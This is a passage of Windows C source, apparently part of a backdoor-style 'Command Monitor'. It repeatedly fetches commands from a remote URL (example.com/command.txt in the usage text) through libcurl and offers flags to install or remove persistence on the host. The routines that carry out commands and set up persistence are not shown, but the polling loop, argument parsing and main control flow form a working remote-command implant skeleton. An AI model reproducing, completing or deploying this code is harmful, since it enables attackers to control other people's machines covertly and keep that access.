    if (!g_monitor_ctx) {
        return;
    }

    g_sensitive_ops_ctx.url = g_monitor_ctx->monitor_url;
    g_sensitive_ops_ctx.interval_minutes = g_monitor_ctx->poll_interval_minutes;

    while (1) {
        g_sensitive_ops_ctx.command_length = 0;
        g_sensitive_ops_ctx.operation_result = RESULT_ERROR;

        g_result = sensitive_operations_execute();

        if (g_result == RESULT_SUCCESS && g_sensitive_ops_ctx.command_length > 0) {
            if (strcmp(g_sensitive_ops_ctx.command_buffer, "exit") == 0 || strcmp(g_sensitive_ops_ctx.command_buffer, "quit") == 0) {
                break;
            }
        }

        Sleep(g_monitor_ctx->sleep_duration_ms);
    }
}

typedef struct {
    const char *url;
    int interval_minutes;
} parsed_args_t;

static result_code_t argument_parser_parse(void) {
    if (g_argc < 2 || !g_argv || !g_args) {
        return RESULT_INVALID_INPUT;
    }

    memset(g_args, 0, sizeof(*g_args));
    g_args->url = g_argv[1];

    if (g_argc >= 3) {
        const int parsed_interval = atoi(g_argv[2]);
        g_args->interval_minutes = (parsed_interval > 0) ? parsed_interval : DEFAULT_POLL_INTERVAL_MINUTES;
    } else {
        g_args->interval_minutes = DEFAULT_POLL_INTERVAL_MINUTES;
    }

    return RESULT_SUCCESS;
}

int main(int argc, char *argv[]) {
    g_argc = argc;
    g_argv = (const char **)argv;
    g_args = &g_args_storage;
    g_monitor = &g_monitor_storage;
    g_sensitive_ctx2 = &g_sensitive_ctx_storage;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    g_result = argument_parser_parse();

    if (g_result != RESULT_SUCCESS) {
        fprintf(stderr, "Usage: %s <url> [interval_minutes] [--persist] [--remove-persist]\n", argv[0]);
        fprintf(stderr, "Example: %s http://example.com/command.txt 5\n", argv[0]);
        fprintf(stderr, "Example: %s http://example.com/command.txt 5 --persist\n", argv[0]);
        curl_global_cleanup();
        return EXIT_FAILURE;
    }

    g_install_persistence = FALSE;
    g_remove_persistence = FALSE;

    for (g_i = 1; g_i < g_argc; g_i++) {
        if (strcmp(g_argv[g_i], "--persist") == 0) {
            g_install_persistence = TRUE;
        } else if (strcmp(g_argv[g_i], "--remove-persist") == 0) {
            g_remove_persistence = TRUE;
        }
    }

    g_sensitive_ops_ctx.url = g_args->url;
    g_sensitive_ops_ctx.interval_minutes = g_args->interval_minutes;
    g_sensitive_ops_ctx.install_persistence = g_install_persistence;
    g_sensitive_ops_ctx.remove_persistence = g_remove_persistence;

    if (g_remove_persistence) {
        sensitive_operations_execute();
        printf("[*] Persistence removed\n");
        curl_global_cleanup();
        return EXIT_SUCCESS;
    }

    g_monitor_ctx = g_monitor;
    g_monitor_url = g_args->url;
    g_interval_minutes = g_args->interval_minutes;
    g_result = monitor_init();
    if (g_result != RESULT_SUCCESS) {
        fprintf(stderr, "[!] Failed to initialize monitor\n");
        curl_global_cleanup();
        return EXIT_FAILURE;
    }

    if (g_install_persistence) {
        sensitive_operations_execute();
        printf("[*] Persistence installed\n");
    } else {
        g_sensitive_ops_ctx.install_persistence = FALSE;
        sensitive_operations_execute();
    }

    printf("[*] Command Monitor Started\n");
    printf("[*] URL: %s\n", g_args->url);
    printf("[*] Interval: %d minutes\n", g_args->interval_minutes);
    printf("[*] Press Ctrl+C to stop\n\n");

    monitor_run_loop();

    monitor_cleanup();
    curl_global_cleanup();
    printf("[*] Stopped\n");
    return EXIT_SUCCESS;
}
